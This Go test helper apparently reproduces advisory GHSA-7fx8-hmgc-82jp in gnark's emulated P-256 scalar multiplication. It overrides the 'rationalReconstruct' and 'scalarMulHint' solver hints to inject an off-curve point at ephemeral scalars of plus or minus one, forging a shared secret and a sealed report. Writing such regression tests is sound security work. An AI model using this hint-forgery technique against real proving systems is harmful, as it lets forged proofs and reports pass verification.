package hosttest

import (
	"crypto/elliptic"
	"math/big"
	"strings"
	"testing"

	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/std/algebra/emulated/sw_emulated"
	"github.com/consensys/gnark/std/math/emulated"
)

type ReportForgery struct {
	Name     string
	Keys     Keys
	ForgedX  *big.Int
	ForgedY  *big.Int
	Mirrored bool
}

// ForgeReports returns the GHSA-7fx8-hmgc-82jp forgery at both ephemeral
// scalars it reaches: s = -1 with the result y negated, and s = +1 with the
// rational reconstruction sign flipped and the result y mirrored.
func ForgeReports(t testing.TB) []ReportForgery {
	t.Helper()
	params := elliptic.P256().Params()
	minusOne := new(big.Int).Sub(params.N, big.NewInt(1))
	return []ReportForgery{
		forgeReport(t, "scalar minus one", minusOne, false),
		forgeReport(t, "scalar one", big.NewInt(1), true),
	}
}

func forgeReport(t testing.TB, name string, ephemeral *big.Int, mirrored bool) ReportForgery {
	t.Helper()
	params := elliptic.P256().Params()
	keys := DefaultKeys()
	recipient := keys.RecipientUncompressed()
	forgedX := new(big.Int).Add(new(big.Int).SetBytes(recipient[1:33]), big.NewInt(1))
	forgedX.Mod(forgedX, params.P)
	recipientY := new(big.Int).SetBytes(recipient[33:65])
	forgedY := new(big.Int).Sub(params.P, recipientY)
	if mirrored {
		forgedY = recipientY
	}
	if params.IsOnCurve(forgedX, forgedY) {
		t.Fatal("the forged x is on the curve")
	}
	var scalar [32]byte
	ephemeral.FillBytes(scalar[:])
	keys.EphemeralSecret = mustKey(scalar)
	return ReportForgery{Name: name, Keys: keys, ForgedX: forgedX, ForgedY: forgedY, Mirrored: mirrored}
}

func (f ReportForgery) Seal(tag, info, plaintext []byte) (ciphertext []byte, sharedSecret *big.Int) {
	sharedSecret = f.Keys.sharedSecret(tag, [32]byte(f.ForgedX.FillBytes(make([]byte, 32))))
	key, nonce := KeySchedule(sharedSecret, info)
	return CTR(key, nonce, plaintext), sharedSecret
}

func (f ReportForgery) Hints(t testing.TB) []solver.Option {
	t.Helper()
	sigma, _ := new(big.Int).SetString(strings.Repeat("55", 16), 16)
	reconstruct := func(mod *big.Int, in, out []*big.Int) error {
		return emulated.UnwrapHintContext(mod, in, out, func(hc emulated.HintContext) error {
			m := hc.EmulatedModuli()
			_, nativeOut := hc.NativeInputsOutputs()
			_, emuOut := hc.InputsOutputs(m[0])
			nativeOut[0].SetUint64(0)
			if f.Mirrored {
				nativeOut[0].SetUint64(1)
			}
			emuOut[0].Set(sigma)
			emuOut[1].Set(sigma)
			return nil
		})
	}
	scalarMul := func(mod *big.Int, in, out []*big.Int) error {
		return emulated.UnwrapHintContext(mod, in, out, func(hc emulated.HintContext) error {
			m := hc.EmulatedModuli()
			_, baseOut := hc.InputsOutputs(m[0])
			baseOut[0].Set(f.ForgedX)
			baseOut[1].Set(f.ForgedY)
			return nil
		})
	}
	return []solver.Option{
		solver.OverrideHint(emulatedHintID(t, "sw_emulated.rationalReconstruct"), reconstruct),
		solver.OverrideHint(emulatedHintID(t, "sw_emulated.scalarMulHint"), scalarMul),
	}
}

func emulatedHintID(t testing.TB, suffix string) solver.HintID {
	t.Helper()
	for _, h := range sw_emulated.GetHints() {
		if strings.HasSuffix(solver.GetHintName(h), suffix) {
			return solver.GetHintID(h)
		}
	}
	t.Fatalf("sw_emulated hint %s not found", suffix)
	return 0
}
